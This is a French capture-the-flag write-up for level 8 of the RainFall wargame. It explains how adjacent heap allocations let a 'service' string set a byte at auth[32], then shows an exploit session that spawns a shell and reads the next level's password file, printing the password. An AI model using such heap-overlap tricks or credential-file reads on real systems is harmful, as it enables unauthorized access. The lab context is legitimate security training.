Dans cet exo, on a juste une fonction main.
Elle boucle a l'infini et attend une entree utilisateur.

Il y a deux variables globales: `auth` et `service`.

Il existe plusieurs commandes:
- `auth ` => `auth = malloc(4); if (strlen(input) < 30) strcpy(auth, input + 5);`
- `reset` => `free(auth);`
- `servic` => `service = strdup(input + 7);`
- `login` => `if (auth[32] != '\0') system("/bin/sh");`

On voit que la fonction `login` va appeler `system("/bin/sh")` si le 33eme caractere de `auth` est different de 0.  
En testant, je vois que les addresses allouees par `malloc` ou `strdup` augmentent de 16 a chaque fois.  
Donc en soi on peut mettre dans `auth` une addresse et ensuite strdup dans `service` 16 characteres.  
Ainsi quand on execute `login`, le 33eme caractere de `auth` sera egal au dernier charactere qu'on a mis dans `service`.  

On peut donc faire notre exploit:
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth test
0x804a008, (nil)
service 0123456789012345x
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$
```
